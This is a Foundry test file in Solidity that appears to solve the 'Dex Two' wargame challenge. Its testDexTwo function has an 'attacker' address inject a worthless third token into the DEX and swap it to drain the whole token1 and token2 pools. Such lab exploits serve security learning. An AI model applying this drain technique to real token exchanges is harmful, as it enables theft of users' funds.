//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import {Test, console} from "forge-std/Test.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract TestDexTwo is Test {
    address public immutable attacker = makeAddr("attacker");
    DexTwo public dexTwo;
    address public token1;
    address public token2;
    address public token3;

    modifier checkSolvedByAttacker() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        dexTwo = new DexTwo();
        token1 = address(new SwappableTokenTwo(address(dexTwo), "Token 1", "T1", 110 ether));
        token2 = address(new SwappableTokenTwo(address(dexTwo), "Token 2", "T2", 110 ether));
        token3 = address(new SwappableTokenTwo(address(dexTwo), "Token 3", "T3", 110 ether));
        dexTwo.setTokens(token1, token2);
        SwappableTokenTwo(token1).transfer(address(dexTwo), 100 ether);
        SwappableTokenTwo(token2).transfer(address(dexTwo), 100 ether);
        SwappableTokenTwo(token1).transfer(attacker, 10 ether);
        SwappableTokenTwo(token2).transfer(attacker, 10 ether);
        SwappableTokenTwo(token3).transfer(attacker, 110 ether);
    }
    function testInitializeState() public view {
        assertEq(dexTwo.balanceOf(token1, address(dexTwo)), 100 ether);
        assertEq(dexTwo.balanceOf(token2, address(dexTwo)), 100 ether);
        assertEq(dexTwo.balanceOf(token1, attacker), 10 ether);
        assertEq(dexTwo.balanceOf(token2, attacker), 10 ether);
        assertEq(dexTwo.balanceOf(token3, attacker), 110 ether);
    }
    function testDexTwo() public checkSolvedByAttacker {
        IERC20(token3).transfer(address(dexTwo), 1 ether);
        IERC20(token3).approve(address(dexTwo), 1 ether);
        dexTwo.swap(token3, token1, 1 ether);
        IERC20(token3).approve(address(dexTwo), 2 ether);
        dexTwo.swap(token3, token2, 2 ether);
    }
    function _isSolved() private view {
        assertEq(dexTwo.balanceOf(token1, address(dexTwo)), 0);
        assertEq(dexTwo.balanceOf(token2, address(dexTwo)), 0);
    }
}
